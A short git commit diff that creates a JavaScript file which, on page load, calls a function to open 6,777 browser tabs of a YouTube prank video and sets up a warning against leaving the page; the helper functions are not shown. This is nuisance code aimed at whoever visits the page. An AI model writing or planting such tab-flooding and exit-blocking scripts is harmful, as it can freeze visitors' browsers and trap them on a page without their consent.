a3356ba0bf0b82e9b66d64a01e8eae0bbda84cdc
skidinghub <235431650+skidinghub@users.noreply.github.com>
2025-10-14 10:43:41 -0500

    Create script.js

---
+++ script.js
@@ -0,0 +1,5 @@
+window.onload = () => {
+  const videoUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+  const tabCount = 6777;
+  openMultipleTabs(videoUrl, tabCount);
+  setupBeforeUnloadWarning();
